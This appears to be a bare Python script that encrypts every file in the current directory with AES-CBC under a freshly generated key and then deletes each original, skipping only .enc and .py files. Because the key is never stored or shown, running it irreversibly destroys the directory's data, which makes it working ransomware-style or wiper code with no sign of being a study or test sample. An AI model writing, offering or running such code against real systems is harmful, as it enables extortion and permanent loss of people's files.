import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_name, key):
    
    backend = default_backend()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    with open(file_name, "rb") as f:
        data = f.read()
    padded_data = data + b"\0" * (16 - len(data) % 16)
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    encrypted_file_name = file_name + ".enc"
    with open(encrypted_file_name, "wb") as f:
        f.write(iv + encrypted_data)

    os.remove(file_name)

key = os.urandom(32) # Generate a random key

for file_name in os.listdir():
    if (os.path.isfile(file_name) and not file_name.endswith(".enc") and
        not file_name.endswith(".py")):
        encrypt_file(file_name, key)
